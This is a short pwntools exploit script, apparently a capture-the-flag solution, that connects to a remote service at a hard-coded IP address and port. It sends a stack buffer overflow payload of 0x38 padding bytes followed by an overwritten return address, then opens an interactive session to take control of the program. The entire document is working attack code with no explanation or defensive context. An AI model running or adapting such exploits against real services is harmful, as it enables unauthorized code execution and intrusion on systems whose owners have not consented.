from pwn import *
context.log_level = 'debug'
#sh = process('./f.o')
sh = remote('183.129.189.60',10025)
sh.recv()
sh.send('a'*0x38+p64(0x000006DA))
sh.interactive()
